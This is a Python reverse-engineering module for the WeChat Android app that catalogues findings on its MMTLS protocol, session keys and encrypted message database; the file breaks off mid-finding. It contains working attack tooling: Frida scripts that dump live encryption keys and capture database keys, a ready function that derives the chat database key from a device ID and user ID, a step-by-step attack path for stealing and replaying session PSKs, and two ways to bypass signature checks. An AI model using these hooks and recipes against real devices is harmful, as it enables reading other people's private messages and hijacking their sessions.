#!/usr/bin/env python3
"""
WeChat Android RE Module
Synthesized from: WeChat 8.0.56 arm64 APK static RE (wechat-arm64.apk, 2025-01-09)
Build: WCONAN_BUILD_VERSION 13.0.1134+release.2024-t4.2-android_fb0253921

Architecture:
  APK → ~170 native libs (arm64-v8a)
  Core transport: libwechatnetwork.so (Mars framework + MMTLS private ext, 3.9MB)
  Protocol JNI:  libMMProtocalJni.so (pack/unpack/crypto JNI bridge, 908K)
  DB encryption: libWCDB.so (SQLite SEE custom build, 4.0MB)
  ML engine:     libXNet.so (xnet neural net / OpenCL, 26MB — NOT network)
  Main app:      libapp.so (compiled C++ business logic, 38MB)

MMTLS Protocol (mars-wechat private fork):
  Source: mars-wechat/mars/mm-ext/src/mmtls/mmtls_lib/comm/
  Crypto: ECDH + AES-GCM + HKDF (TLS 1.3 style) + SM4-GCM (CN national standard)
  Key arch: HybridEcdh (static+ephemeral) → AxEcdh (double ratchet for forward secrecy)
  Session resumption: PSK 0-RTT mode (SaveAuthLongList/SaveAuthShortList)
  Live key: mmtls::gILinkKey global (72 bytes, BSS) in libwechatnetwork.so

DB encryption:
  libWCDB.so → SQLCipher (NOT SQLite SEE — confirmed via cipherUseHmac/cipherHmacAlgorithm PRAGMAs)
  Key derivation: computerKeyWithAllStr(IMEI, UIN, etype=0→MD5) in libMMProtocalJni.so
  Algorithm table @ 0xe3c40: etype 0=MD5(16B), etype 1=SHA1(20B), etype 2=EC(128B)

Pack format (from mmpack.cpp log strings):
  Header fields: g_clientVer, type, flag, noticeid, newflag, groupKey, sequence
  Body fields:   uin, func (CGI), ret, encryptAlgo, compressAlgo, compressVer, device_id

encryptAlgo enum (from AES_GCM_ENCRYPT / SM4_GCM_ENCRYPT / ECDH_ENCRYPT strings):
  0 = NO_ENCRYPT
  1 = AES (RSA-wrapped key)
  2 = AES_GCM (symmetric, nonce-based)
  3 = ECDH_ENCRYPT (ECDH-wrapped)
  4 = SM4_GCM (Chinese national cipher, GCM mode)

Findings:
  F1  MMTLS protocol — custom TLS variant with AES-GCM + SM4-GCM + double-ratchet
  F2  ALERT_FALLBACK_NO_MMTLS — level=2/type=0x74; OnAlert@0x1cc100; sets mmtls_obj[0x3e4]=1
  F3  PSK 0-RTT session resumption — extracted PSK enables no-handshake replay
  F4  gILinkKey runtime MMTLS key extractable via Frida/ptrace
  F5  computerKeyWithAllStr DB key derivation — requires IMEI + UIN to decrypt DB
  F6  Three-repo build: mars(OSS) + mars-wechat(MMTLS) + mars-private(IP obfuscation)
  F7  libapp.so 38MB contains all business logic in compiled C++ (not Java/DEX)
  F8  .cso compressed .so format — WeChat's custom loader decompresses at runtime
  F9  SQLCipher (not SQLite SEE) — PRAGMA key interface, HMAC per-page auth, standard tooling works
  F10 Alert XML + dual ECDSA sigs; hardcoded 2020 Tencent alert at 0x42d3b; timestamp check bypassed
  F11 CGI function code table: 200+ reqid→name (sendmsg/newsync/pay) from alert XML body
  F12 HKDF derivation chain confirmed: 7 labels, trafficKeyPair=56B layout, PSK/app key labels
  F13 Deterministic nonce: xorNonce(nonce[8:12], LE32(seq)); NIST AES-GCM violation; keystream recovery
  F14 Server P-256 pubkey dual use: ECDH key exchange + ECDSA verify (same hardcoded key)
  F15 Session Save() wire format: u16-len(pskAccess)||u16-len(pskRefresh)||newSessionTicket
"""

import subprocess
import json
import os
import struct
import hashlib
import zipfile
from pathlib import Path

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# --- Key native lib targets (by attack surface) ---
MMTLS_LIBS = [
    "libwechatnetwork.so",   # Mars+MMTLS full implementation
    "libMMProtocalJni.so",   # pack/unpack/crypto JNI bridge
]
DB_LIBS = [
    "libWCDB.so",            # SQLite SEE encrypted DB
    "libmmkv.so",            # MMKV key-value store
]
CRYPTO_LIBS = [
    "libcrypto.so",          # OpenSSL 1.1.x (used by network libs)
    "libssl.so",
]
# gILinkKey address in libwechatnetwork.so arm64 v8.0.56
GILIINKKEY_VA = 0x3d4648
GILIINKKEY_SIZE = 72  # bytes, BSS section

# MMTLS record type constants (from gommtls/mmtls/const.go)
MMTLS_PROTOCOL_VERSION   = 0xF104
MMTLS_MAGIC_ABORT        = 0x15  # Alert record
MMTLS_MAGIC_HANDSHAKE    = 0x16  # Handshake record
MMTLS_MAGIC_RECORD       = 0x17  # Application data record
MMTLS_MAGIC_SYSTEM       = 0x19  # PSK session-resumption record
MMTLS_CIPHER_PSK         = 0xA8  # TLS_PSK_WITH_AES_128_GCM_SHA256
MMTLS_CIPHER_ECDHE       = 0xC02B # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256

# HKDF label strings confirmed from gommtls source (mmtls.go)
# All labels: info = label_bytes + sha256_hasher_sum (except "server/client finished")
HKDF_LABEL_HANDSHAKE_KEYS  = b"handshake key expansion"    # → 56B trafficKeyPair
HKDF_LABEL_APP_KEYS        = b"application data key expansion"  # → 56B trafficKeyPair
HKDF_LABEL_EXPANDED_SECRET = b"expanded secret"             # → 32B (no trailing hash)
HKDF_LABEL_PSK_ACCESS      = b"PSK_ACCESS"                  # → 32B
HKDF_LABEL_PSK_REFRESH     = b"PSK_REFRESH"                 # → 32B
HKDF_LABEL_SERVER_FINISHED = b"server finished"             # → 32B (hash=nil, label only)
HKDF_LABEL_CLIENT_FINISHED = b"client finished"             # → 32B (hash=nil, label only)

# trafficKeyPair layout (56 bytes) — confirmed from gommtls computeTrafficKey()
# clientKey   = trafficKey[0:16]
# serverKey   = trafficKey[16:32]
# clientNonce = trafficKey[32:44]  (12 bytes)
# serverNonce = trafficKey[44:56]  (12 bytes)
TRAFFIC_KEY_PAIR_SIZE = 56

# Server P-256 pubkey — hardcoded in gommtls const.go, used for BOTH ECDH key exchange
# AND ECDSA signature verification (verifyEcdsa uses ServerEcdh pubkey)
SERVER_ECDH_PUBKEY_X = "1da177b6a5ed34dabb3f2b047697ca8bbeb78c68389ced43317a298d77316d54"
SERVER_ECDH_PUBKEY_Y = "4175c032bc573d5ce4b3ac0b7f2b9a8d48ca4b990ce2fa3ce75cc9d12720fa35"

# MMTLS JNI attack surface in libwechatnetwork.so
MMTLS_JNI_FUNCS = [
    "Java_com_tencent_mm_jni_utils_UtilsJni_GenEcdhKeyPair",
    "Java_com_tencent_mm_jni_utils_UtilsJni_Ecdh",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HKDF",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhEncrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhDecrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhEncrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhDecrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmEncryptWithNonce",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmDecryptWithNonce",
    "Java_com_tencent_mars_mm_MMLogic_clearMMtlsForbidenHostAndPsk",
    "Java_com_tencent_mars_mm_MMLogic_saveAuthLongList",
    "Java_com_tencent_mars_mm_MMLogic_saveAuthShortList",
]

# Protocol JNI attack surface in libMMProtocalJni.so
PROTO_JNI_FUNCS = [
    "Java_com_tencent_mm_protocal_MMProtocalJni_pack",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packHybrid",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packHybridEcdh",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packDoubleHybrid",
    "Java_com_tencent_mm_protocal_MMProtocalJni_unpack",
    "Java_com_tencent_mm_protocal_MMProtocalJni_generateECKey",
    "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr",
    "Java_com_tencent_mm_protocal_MMProtocalJni_aesDecrypt",
    "Java_com_tencent_mm_protocal_MMProtocalJni_aesEncrypt",
]


def _run(cmd, **kwargs):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
        return r.stdout, r.stderr, r.returncode
    except Exception as e:
        return "", str(e), -1


class WeChatREAnalyzer:
    """
    Static and runtime RE for WeChat Android app.
    Targets: MMTLS protocol internals, DB key derivation, native lib attack surface.
    """

    def __init__(self, apk_path=None, libs_dir=None):
        self.apk_path = Path(apk_path) if apk_path else None
        self.libs_dir = Path(libs_dir) if libs_dir else None
        self.findings = []
        self.lib_inventory = {}
        self._arch = "arm64-v8a"

    # ------------------------------------------------------------------
    # APK analysis
    # ------------------------------------------------------------------

    def analyze_apk(self):
        """Extract metadata and native lib inventory from APK."""
        if not self.apk_path or not self.apk_path.exists():
            return {"error": f"APK not found: {self.apk_path}"}

        result = {
            "apk": str(self.apk_path),
            "size_mb": round(self.apk_path.stat().st_size / 1e6, 1),
        }

        try:
            with zipfile.ZipFile(str(self.apk_path)) as zf:
                names = zf.namelist()
                arm64_libs = [n for n in names if n.startswith(f"lib/{self._arch}/") and n.endswith(".so")]
                cso_libs   = [n for n in names if n.startswith(f"lib/{self._arch}/") and n.endswith(".cso.so")]
                stub_libs  = []
                full_libs  = []
                for n in arm64_libs:
                    info = zf.getinfo(n)
                    if info.file_size <= 64:
                        stub_libs.append(n)
                    else:
                        full_libs.append((n, info.file_size))

                result["native_lib_count"] = len(arm64_libs)
                result["cso_compressed_count"] = len(cso_libs)
                result["stub_shim_count"] = len(stub_libs)
                result["top_libs_by_size"] = sorted(
                    [(Path(n).name, round(sz / 1e6, 2)) for n, sz in full_libs],
                    key=lambda x: -x[1]
                )[:20]

                # AndroidManifest.xml (binary XML, partial parse)
                if "AndroidManifest.xml" in names:
                    raw = zf.read("AndroidManifest.xml")
                    result["manifest_size"] = len(raw)

        except Exception as e:
            result["error"] = str(e)

        return result

    # ------------------------------------------------------------------
    # Native lib symbol analysis
    # ------------------------------------------------------------------

    def enumerate_native_libs(self):
        """Run nm -D against key native libs to enumerate JNI exports."""
        if not self.libs_dir:
            return {}

        lib_base = self.libs_dir / self._arch
        results = {}

        for lib_name in MMTLS_LIBS + DB_LIBS:
            lib_path = lib_base / lib_name
            if not lib_path.exists():
                results[lib_name] = {"status": "not_found"}
                continue

            stdout, _, rc = _run(["nm", "-D", "--defined-only", str(lib_path)])
            exports = [line.strip() for line in stdout.splitlines() if " T " in line]
            jni_exports = [e for e in exports if "Java_" in e]
            size_mb = round(lib_path.stat().st_size / 1e6, 2)

            results[lib_name] = {
                "size_mb": size_mb,
                "total_exports": len(exports),
                "jni_exports": len(jni_exports),
                "jni_functions": [e.split(" T ")[-1] for e in jni_exports],
            }

        self.lib_inventory = results
        return results

    # ------------------------------------------------------------------
    # MMTLS protocol surface
    # ------------------------------------------------------------------

    def analyze_mmtls(self):
        """
        Reconstruct MMTLS attack surface from static RE.
        Based on symbols/strings extracted from libwechatnetwork.so.
        """
        findings = []

        # F1: MMTLS crypto architecture
        findings.append({
            "id": "WX-F1",
            "title": "MMTLS Two-Tier Crypto: HybridEcdh + AxEcdh (double ratchet)",
            "severity": "INFO",
            "detail": (
                "MMTLS uses a two-tier key architecture:\n"
                "  Tier 1 — HybridEcdh: static server key + ephemeral client key → session key\n"
                "  Tier 2 — AxEcdh: double ratchet (Signal-style) for forward secrecy\n"
                "Cipher suites: AES-GCM (default), SM4-GCM (Chinese national standard fallback)\n"
                "KDF: HKDF (HKDF-Expand-Finished-Secret visible in log strings)\n"
                "Handshake format: mmtls_handshake_messages.cpp (private mars-wechat repo)"
            ),
            "evidence": {
                "symbols": ["Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhEncrypt",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhEncrypt",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmEncryptWithNonce",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_HKDF"],
                "source_path": "mars-wechat/mars/mm-ext/src/mmtls/mmtls_lib/comm/",
                "sm4_string": "SM4_GCM_ENCRYPT no need decrypt here len:%d algo:%d",
            },
        })

        # F2: Protocol downgrade via ALERT_FALLBACK_NO_MMTLS
        findings.append({
            "id": "WX-F2",
            "title": "MMTLS Downgrade: ALERT_FALLBACK_NO_MMTLS forces plaintext HTTPS fallback",
            "severity": "MEDIUM",
            "detail": (
                "Server can send ALERT_FALLBACK_NO_MMTLS to force WeChat to downgrade to HTTPS.\n"
                "Alert wire format: level=2 (fatal, uint8 @ alert_struct+0x08), type=0x74 (uint16 LE @ alert_struct+0x0a).\n"
                "OnAlert dispatch @ libwechatnetwork.so:0x1cc100: level==2 → type check → 0x74 → handler @ 0x1cc308.\n"
                "Handler verifies session ticket (bl 0x1d98a0), then sets mmtls_obj[0x3e4]=1 (MMTLS disabled flag).\n"
                "Log string @ 0x6a2c2 (typo in binary): 'recevie fallback no mmtls alert and verify succ, set no mmtls, %u'.\n"
                "type==0x73: PSK_DELETE alert — 'debug: delete access psk, ret %d' (@ 0x4b376), calls PSK invalidation.\n"
                "Source: mmtls_client_handshake_state.h (embedded path @ 0x4b40f).\n"
                "MITM injection requires valid alert signature (bl 0x1d98a0 verifies before setting flag)."
            ),
            "evidence": {
                "alert_type_fallback":   "0x74 (116 decimal)",
                "alert_type_psk_delete": "0x73 (115 decimal)",
                "alert_level":           "2 (fatal)",
                "on_alert_va":           "0x1cc100",
                "fallback_handler_va":   "0x1cc308",
                "mmtls_disabled_flag":   "mmtls_obj+0x3e4 = 1",
                "log_va":                "0x6a2c2",
                "log_string":            "recevie fallback no mmtls alert and verify succ, set no mmtls, %u",
                "psk_delete_log_va":     "0x4b376",
                "fallback_log_vas":      ["0x3553d", "0x39ff2", "0x416cf"],
                "error_codes":           {"valid": "kEctMMTLSValidFallbackAlert @ 0x521ad",
                                          "invalid": "kEctMMTLSInvalidFallbackAlert @ 0x795bd"},
            },
            "frida_hook": (
                "// Hook OnAlert to detect FALLBACK\n"
                "var base = Module.findBaseAddress('libwechatnetwork.so');\n"
                "Interceptor.attach(base.add(0x1cc100), {\n"
                "    onEnter: function(args) {\n"
                "        var alert = ptr(args[0]);\n"
                "        var level = alert.add(0x08).readU8();\n"
                "        var type  = alert.add(0x0a).readU16();\n"
                "        if (type === 0x74) {\n"
                "            console.log('[WX-F2] ALERT_FALLBACK_NO_MMTLS level=' + level + ' type=0x' + type.toString(16));\n"
                "        } else if (type === 0x73) {\n"
                "            console.log('[WX-F2] PSK_DELETE alert');\n"
                "        }\n"
                "    }\n"
                "});\n"
                "// Or hook flag write: base+0x1cc3e4 (strb w8, [x19+0x3e4])"
            ),
        })

        # F3: PSK 0-RTT session resumption
        findings.append({
            "id": "WX-F3",
            "title": "MMTLS PSK 0-RTT Session Resumption — extracted PSK enables replay",
            "severity": "HIGH",
            "detail": (
                "WeChat stores MMTLS session PSKs in 'Auth Long List' and 'Auth Short List'.\n"
                "PSKs are serialized (MAX_SERIALIZED_PSK_LEN enforced) and stored as\n"
                "  encrypted_refresh_psk + encrypted_ticket in ClientCredStorage.\n"
                "On reconnect, WeChat sends PSK in 0-RTT mode (HS_MODE_ZERO_RTT_PSK).\n"
                "\n"
                "On-disk file: /data/data/com.tencent.mm/files/mmtls/%08llx (hex session ID)\n"
                "File format: [IV 12B][ciphertext N bytes][GCM auth tag 16B]\n"
                "\n"
                "PSK encryption key source candidates (ranked by likelihood):\n"
                "  1. HARDCODED: 16/32-byte entropy blob in libwechatnetwork.so .rodata\n"
                "     → scan: python3 -c \"d=open('libwechatnetwork.so','rb').read(); "
                "[print(hex(i),d[i:i+32].hex()) for i in range(0,len(d)-32,4) "
                "if d[i:i+32].count(0)<4 and all(d[i+j]!=0 for j in range(0,32,4))]\"\n"
                "  2. DEVICE-DERIVED: HKDF(ANDROID_ID | UIN, salt=hardcoded, info='mmtls')\n"
                "  3. ANDROID KEYSTORE: unlikely (performance; getEncoded() returns null)\n"
                "\n"
                "Attack: extract PSK from device storage → replay as WeChat client without\n"
                "  completing ECDH handshake. Requires access to app private data dir."
            ),
            "evidence": {
                "symbols": ["Java_com_tencent_mars_mm_MMLogic_saveAuthLongList",
                           "Java_com_tencent_mars_mm_MMLogic_saveAuthShortList",
                           "Java_com_tencent_mars_mm_MMLogic_clearMMtlsForbidenHostAndPsk"],
                "strings": ["ClientCredStorage",
                           "size == encrypted_refresh_psk.size()",
                           "mmtls: MAX_SERIALIZED_PSK_LEN=%d, read read size=%zu",
                           "(state_.mode() != HS_MODE_ZERO_RTT_PSK && app_data != NULL)"],
                "file_path": "/data/data/com.tencent.mm/files/mmtls/%08llx",
                "file_format": "IV[12] || AES-GCM-ciphertext || tag[16]",
            },
            "attack_path": (
                "1. Root device or ADB backup on unpatched device\n"
                "2. adb shell run-as com.tencent.mm ls files/mmtls/\n"
                "3. Pull /data/data/com.tencent.mm/files/mmtls/<hex> files\n"
                "4. Determine encryption key: hook EVP_DecryptInit_ex arg4 in libwechatnetwork.so\n"
                "5. Decrypt: IV=bytes[0:12], tag=bytes[-16:], ciphertext=bytes[12:-16]\n"
                "6. Deserialize PSK using mmtls_lib proto format\n"
                "7. Replay with mmtls client using 0-RTT mode (HS_MODE_ZERO_RTT_PSK)"
            ),
            "frida_hook": (
                "// Find PSK file path via open() intercept\n"
                "Interceptor.attach(Module.findExportByName('libc.so', 'open'), {\n"
                "  onEnter(args) {\n"
                "    const path = args[0].readCString();\n"
                "    if (path && path.includes('mmtls')) console.log('[mmtls open]', path);\n"
                "  }\n"
                "});\n"
                "// Extract AES-GCM key from EVP_DecryptInit_ex\n"
                "const EVP_Di = Module.findExportByName('libssl.so', 'EVP_DecryptInit_ex');\n"
                "if (EVP_Di) Interceptor.attach(EVP_Di, {\n"
                "  onEnter(args) {\n"
                "    if (!args[3].isNull()) console.log('[PSK key]', hexdump(args[3], {length:32}));\n"
                "    if (!args[4].isNull()) console.log('[PSK iv]',  hexdump(args[4], {length:12}));\n"
                "  }\n"
                "});"
            ),
        })

        # F4: gILinkKey runtime key extraction
        findings.append({
            "id": "WX-F4",
            "title": "gILinkKey runtime MMTLS link key extractable via Frida/ptrace",
            "severity": "HIGH",
            "detail": (
                "mmtls::gILinkKey is a 72-byte OBJECT in BSS of libwechatnetwork.so.\n"
                f"VA: 0x{GILIINKKEY_VA:x}, size: {GILIINKKEY_SIZE} bytes\n"
                "Contains live MMTLS session key material for the active connection.\n"
                "Frida: read from memory after LongLinkWithMMTLS constructor returns.\n"
                "ptrace: PTRACE_PEEKDATA on WeChat PID at resolved VA after lib load.\n"
                "\n"
                "Struct layout hypotheses (72 bytes = 9×8B or mixed):\n"
                "  H1 (dual-cipher): AES-256-key[16] | SM4-key[16] | GCM-nonce[12] |\n"
                "                    PSK-identity[16] | session-id[8] | flags[4]\n"
                "  H2 (single-cipher): key[32] | nonce[12] | counter[4] | pad[24]\n"
                "Confirm by tracing EVP_EncryptInit_ex args: arg3=key ptr, arg4=nonce ptr,\n"
                "measuring byte distance from gILinkKey base.\n"
                "\n"
                "ARM64 RE note: LDP instruction loads two consecutive 8-byte fields\n"
                "simultaneously — LDP x19, x20, [x0, #0x10] loads +0x10 and +0x18.\n"
                "Ctor entry point: LongLinkWithMMTLSC1E @ 0x1ab2c4; expect prologue:\n"
                "  stp x29, x30, [sp, #-N]! then stp x19, x20, [sp, #M] (callee save)\n"
                "  then str/stp to [x0, #field_offset] for member initialization."
            ),
            "evidence": {
                "symbol": "_ZN5mmtls9gILinkKeyE",
                "va": hex(GILIINKKEY_VA),
                "size": GILIINKKEY_SIZE,
                "section": "BSS (GLOBAL OBJECT)",
                "ctor_va": "0x1ab2c4 (LongLinkWithMMTLSC1E)",
                "key_deriv_errors": [
                    "0x625eb: 'hkdf expand connection key fail'",
                    "0x7b4f3: 'compute connection keys fail'",
                    "0x7022a: 'hash for derving connection key fail'",
                ],
            },
            "frida_hook": (
                "// Read gILinkKey from running WeChat process\n"
                "const libnet = Process.getModuleByName('libwechatnetwork.so');\n"
                "const keyAddr = libnet.base.add(0x{va:x});\n"
                "console.log('[gILinkKey dump]');\n"
                "console.log(hexdump(keyAddr, {{length: {sz}}}));\n"
                "\n"
                "// Catch init moment via MemoryAccessMonitor\n"
                "MemoryAccessMonitor.enable({{base: keyAddr, size: {sz}}}, {{\n"
                "  onAccess(d) {{\n"
                "    if (d.operation === 'write') {{\n"
                "      console.log('[gILinkKey write] from', d.from, 'offset', d.rangeIndex);\n"
                "      console.log(Thread.backtrace(this.context, Backtracer.ACCURATE)\n"
                "        .map(DebugSymbol.fromAddress).join('\\n'));\n"
                "    }}\n"
                "  }}\n"
                "}});\n"
                "\n"
                "// Hook EVP_EncryptInit_ex to correlate key/nonce offsets\n"
                "const EVP_Ei = Module.findExportByName('libssl.so', 'EVP_EncryptInit_ex');\n"
                "if (EVP_Ei) Interceptor.attach(EVP_Ei, {{\n"
                "  onEnter(args) {{\n"
                "    const keyPtr = args[3]; const ivPtr = args[4];\n"
                "    if (!keyPtr.isNull()) {{\n"
                "      const off = keyPtr.sub(keyAddr).toInt32();\n"
                "      console.log('[EVP key] gILinkKey+' + off, hexdump(keyPtr, {{length:32}}));\n"
                "    }}\n"
                "    if (!ivPtr.isNull()) {{\n"
                "      const off = ivPtr.sub(keyAddr).toInt32();\n"
                "      console.log('[EVP iv]  gILinkKey+' + off, hexdump(ivPtr, {{length:12}}));\n"
                "    }}\n"
                "  }}\n"
                "}});".format(va=GILIINKKEY_VA, sz=GILIINKKEY_SIZE)
            ),
        })

        # F5: DB key derivation (CORRECTED: SQLCipher, not SQLite SEE)
        findings.append({
            "id": "WX-F5",
            "title": "WeChat DB key: computerKeyWithAllStr(IMEI, UIN, etype=0→MD5) → SQLCipher key",
            "severity": "HIGH",
            "detail": (
                "libWCDB.so uses SQLCipher (NOT SQLite SEE).\n"
                "Evidence: cipherUseHmac/cipherHmacAlgorithm/cipherDefaultUseHmac PRAGMAs in libWCDB.so,\n"
                "sha1_block_data_order + _armv8_sha1_probe (SQLCipher HMAC path).\n"
                "Key derivation: computerKeyWithAllStr dispatches via etype parameter:\n"
                "  etype 0 (DB key): output_size=16 → MD5; fn @ libMMProtocalJni.so:0x3f438\n"
                "  etype 1: output_size=20 → SHA1; fn @ libMMProtocalJni.so:0x3f4d8\n"
                "  etype 2: output_size=128 → EC key (no direct compute fn)\n"
                "Algorithm dispatch table: libMMProtocalJni.so @ 0xe3c40\n"
                "Result: MD5(IMEI+UIN).hexdigest()[:7] = 7-char SQLCipher PRAGMA key.\n"
                "Attack: IMEI from device + UIN from login → compute key → sqlcipher open."
            ),
            "evidence": {
                "jni_func": "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr",
                "algo_table": "libMMProtocalJni.so @ 0xe3c40 (etype→{size,fn_ptr})",
                "lib": "libWCDB.so (SQLCipher)",
                "sqlcipher_pragmas": [
                    "cipherUseHmac", "cipherHmacAlgorithm", "cipherDefaultUseHmac"
                ],
            },
            "key_formula": (
                "# Confirmed from static RE (etype=0 path, MD5, 16-byte output → 7-char hex):\n"
                "import hashlib\n"
                "def wechat_db_key(imei_or_android_id: str, uin: str) -> str:\n"
                "    # API <= 28: imei = TelephonyManager.getDeviceId() or getImei(0)\n"
                "    # API >= 29: IMEI access restricted; WeChat falls back to ANDROID_ID:\n"
                "    #   adb shell settings get secure android_id\n"
                "    raw = (imei_or_android_id + uin).encode('utf-8')\n"
                "    return hashlib.md5(raw).hexdigest()[:7]\n"
                "# Open DB (SQLCipher 3.x params):\n"
                "#   sqlcipher EnMicroMsg.db\n"
                "#   PRAGMA key='<7chars>';\n"
                "#   PRAGMA cipher_compatibility=3;\n"
                "#   .tables"
            ),
            "frida_hook": (
                "// Hook sqlite3_key to capture the key at open time\n"
                "['sqlite3_key', 'sqlite3_key_v2'].forEach(name => {\n"
                "  const fn = Module.findExportByName(null, name);\n"
                "  if (fn) Interceptor.attach(fn, {\n"
                "    onEnter(args) {\n"
                "      const nBytes = args[name === 'sqlite3_key' ? 2 : 3].toInt32();\n"
                "      const kPtr  = args[name === 'sqlite3_key' ? 1 : 2];\n"
                "      console.log('[' + name + '] key =', kPtr.readUtf8String(nBytes));\n"
                "    }\n"
                "  });\n"
                "});\n"
                "// Hook MessageDigest.update to catch MD5 input (IMEI+UIN concatenation)\n"
                "Java.perform(() => {\n"
                "  const MD = Java.use('java.security.MessageDigest');\n"
                "  MD.update.overload('[B').implementation = function(b) {\n"
                "    const alg = this.getAlgorithm();\n"
                "    if (alg === 'MD5') console.log('[MD5 input]',\n"
                "      Java.use('java.lang.String').$new(b, 'UTF-8'));\n"
                "    return this.update(b);\n"
                "  };\n"
                "});"
            ),
        })

        # F6: Pack format reconstruction
        findings.append({
            "id": "WX-F6",
            "title": "WeChat pack format reconstructed from mmpack.cpp log strings",
            "severity": "INFO",
            "detail": (
                "Header: g_clientVer(u32), type(u8), flag(u8), noticeid(u32),\n"
                "        newflag(u8), groupKey(u8), sequence(u32)\n"
                "Body:   uin(u32), func(u16 CGI cmd), ret(i32), device_id(u32)\n"
                "        encryptAlgo(u8), compressAlgo(u8), compressVer(u8)\n"
                "\n"
                "encryptAlgo values (from string evidence):\n"
                "  0 = NO_ENCRYPT\n"
                "  1 = AES (classic, RSA-wrapped key)\n"
                "  2 = AES_GCM (symmetric nonce-based)\n"
                "  3 = ECDH_ENCRYPT\n"
                "  4 = SM4_GCM (Chinese national cipher)\n"
                "\n"
                "Pack variants: pack / packHybrid / packHybridEcdh / packDoubleHybrid\n"
                "Source: Comm/mmpack.cpp, build path: /data/landun/workspace/libprotocaljni/"
            ),
            "evidence": {
                "log_strings": [
                    "writing head, g_clientVer: %d, type:%d, flag:%d noticeid:%d, newflag:%d groupKey:%d sequence:%d",
                    "packing done, uin=%d, func=%d, ret=%d, encryptAlgo=%d, compressAlgo=%d",
                    "AES_GCM_ENCRYPT no need compress again here. type:%d",
                    "SM4_GCM_ENCRYPT no need decrypt here len:%d algo:%d",
                ],
            },
        })

        # F10: HKDF connection key derivation
        findings.append({
            "id": "WX-F10",
            "title": "HKDF EXPAND_ONLY derives MMTLS connection keys from session secret",
            "severity": "INFO",
            "detail": (
                "Error string 'hkdf expand connection key fail' @ 0x625eb → EVP_PKEY HKDF in EXPAND_ONLY mode.\n"
                "OpenSSL EVP_PKEY HKDF call chain (WeChat's BoringSSL fork):\n"
                "  EVP_PKEY_CTX_new_id(EVP_PKEY_HKDF, NULL)\n"
                "  EVP_PKEY_CTX_hkdf_mode(ctx, EVP_PKEY_HKDEF_MODE_EXPAND_ONLY)\n"
                "  EVP_PKEY_CTX_set_hkdf_md(ctx, EVP_sha256())\n"
                "  EVP_PKEY_CTX_set1_hkdf_key(ctx, prk, prk_len)   // PRK from extract phase\n"
                "  EVP_PKEY_CTX_add1_hkdf_info(ctx, 'connection key', 14) // info/label\n"
                "  EVP_PKEY_derive(ctx, out, &out_len)               // 32B AES-256 key\n"
                "Frida: hook EVP_PKEY_derive; force return 1 + zero-fill output to observe downstream.\n"
                "Three error strings map to the HKDF→AES-GCM key setup pipeline:\n"
                "  0x7022a: hash for deriving connection key fail (extract phase)\n"
                "  0x625eb: hkdf expand connection key fail (expand phase)\n"
                "  0x7b4f3: compute connection keys fail (caller wrapping both)"
            ),
            "evidence": {
                "error_strings": {
                    "0x7022a": "hash for derving connection key fail",
                    "0x625eb": "hkdf expand connection key fail",
                    "0x7b4f3": "compute connection keys fail",
                },
                "hkdf_mode": "EVP_PKEY_HKDEF_MODE_EXPAND_ONLY (2)",
                "info_label": "'connection key' (14 bytes)",
                "output_len": "32 bytes (AES-256-GCM key)",
            },
            "frida_hook": (
                "// Intercept HKDF output — catches derived connection key\n"
                "// EVP_PKEY_derive(ctx, key_out, &key_len)\n"
                "const libssl = Process.findModuleByName('libssl.so') ||\n"
                "               Process.findModuleByName('libcrypto.so');\n"
                "if (libssl) {\n"
                "  const derive = Module.findExportByName(libssl.name, 'EVP_PKEY_derive');\n"
                "  if (derive) Interceptor.attach(derive, {\n"
                "    onEnter(args) { this.out = args[1]; this.outLen = args[2]; },\n"
                "    onLeave(ret) {\n"
                "      if (ret.toInt32() === 1 && !this.out.isNull()) {\n"
                "        const len = this.outLen.readU64().toNumber();\n"
                "        console.log('[WX-F10] HKDF derived key (' + len + 'B):',\n"
                "          hexdump(this.out, {length: len}));\n"
                "      }\n"
                "    }\n"
                "  });\n"
                "}"
            ),
        })

        # F11: ECDSA alert signature verification
        findings.append({
            "id": "WX-F11",
            "title": "MMTLS alert ECDSA verify — hardcoded P-256 pubkey; bypass CLOSED",
            "severity": "MEDIUM",
            "detail": (
                "Alert handler verifies ECDSA/SHA-256 signature before acting on ALERT_FALLBACK_NO_MMTLS.\n"
                "Hardcoded Tencent P-256 public key at libwechatnetwork.so:0x8c2e9 (65B uncompressed).\n"
                "Verify chain @ 0x3a1470: d2i_EC_PUBKEY → SHA256 → d2i_ECDSA_SIG → ECDSA_do_verify.\n"
                "ECDSA_do_verify return semantics: 1=valid, 0=invalid (no error queued), -1=internal error.\n"
                "\n"
                "Bypass approach A: hook ECDSA_do_verify, return 1 unconditionally.\n"
                "  → Returns 1 puts nothing on error queue; no ERR_clear_error() needed.\n"
                "  → Does NOT bypass cmp w21,1 at 0x210044 (sees raw d2i_ECDSA_SIG result).\n"
                "\n"
                "Bypass approach B: patch .rodata pubkey @ 0x8c2e9 with own P-256 DER (65B).\n"
                "  Memory.protect(base.add(0x8c2e9), 65, 'rwx')\n"
                "  base.add(0x8c2e9).writeByteArray([0x04, ...own_X_32B, ...own_Y_32B])\n"
                "  → Then sign forged alerts with own private key.\n"
                "\n"
                "BYPASS STATUS: CLOSED — see WX-F13. cmp w21,1 at 0x210044 checks DER parse\n"
                "result directly. Forged pubkey/ECDSA hook still fails at the XML signature2\n"
                "check which requires the second P-256 sig over XML body + md5 + timestamp."
            ),
            "evidence": {
